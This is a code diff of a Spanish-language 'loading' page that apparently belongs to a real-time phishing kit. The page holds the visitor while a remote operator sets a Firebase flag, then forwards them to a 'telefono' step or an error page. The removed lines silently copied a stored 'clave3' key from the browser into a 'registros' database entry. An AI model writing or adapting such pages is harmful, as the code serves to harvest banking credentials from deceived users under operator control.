@@ -2,24 +2,27 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificando Clave 3.0</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cargando Datos...</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #fff;
+      background: white;
       color: red;
-      text-align: center;
-      padding-top: 30vh;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .dots span {
       display: inline-block;
       width: 10px;
       height: 10px;
-      margin: 0 3px;
+      margin: 0 4px;
       background-color: red;
       border-radius: 50%;
       animation: blink 1.4s infinite both;
@@ -33,7 +36,7 @@
   </style>
 </head>
 <body>
-  <h2>Verificando Clave 3.0...</h2>
+  <h2>Cargando Datos...</h2>
   <div class="dots"><span></span><span></span><span></span></div>
 
   <script>
@@ -48,18 +51,11 @@
 
     db.ref("validacion_estado").on("value", snap => {
       const val = snap.val();
-      if (val === "correcto") {
-        db.ref("registros").limitToLast(1).once("value", snap => {
-          const data = snap.val();
-          const key = Object.keys(data || {})[0];
-          if (key) {
-            db.ref("registros/" + key + "/clave3").set(localStorage.getItem("clave3_input") || "");
-          }
-        });
-        db.ref("validacion_final").set("");
-        window.location.href = "final.html";
-      } else if (val === "incorrecto") {
-        db.ref("validacion_final").set("");
+      if (val === "siguiente") {
+        db.ref("validacion_estado").set("");
+        window.location.href = "telefono.html";
+      } else if (val === "error") {
+        db.ref("validacion_estado").set("");
         window.location.href = "error.html";
       }
     });
